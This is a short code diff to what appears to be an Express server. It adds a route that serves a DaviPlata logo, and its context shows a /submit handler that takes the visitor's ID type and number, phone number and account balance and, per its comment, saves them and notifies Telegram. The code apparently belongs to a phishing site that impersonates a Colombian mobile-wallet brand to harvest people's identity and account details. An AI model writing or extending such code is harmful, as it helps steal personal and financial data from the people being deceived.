@@ -104,6 +104,12 @@ app.get('/', (req, res) => {
   res.sendFile(path.join(__dirname, 'index.html'));
 });
 
+// GET explícito para el logo SVG (garantiza cargar en Vercel)
+app.get('/img/logo-daviplata.svg', (req, res) => {
+  res.type('image/svg+xml');
+  res.sendFile(path.join(__dirname, 'img', 'logo-daviplata.svg'));
+});
+
 // POST /submit → guardar datos + notificar Telegram
 app.post('/submit', async (req, res) => {
   const { tipo_documento, num_documento, num_celular, saldo_cuenta } = req.body;
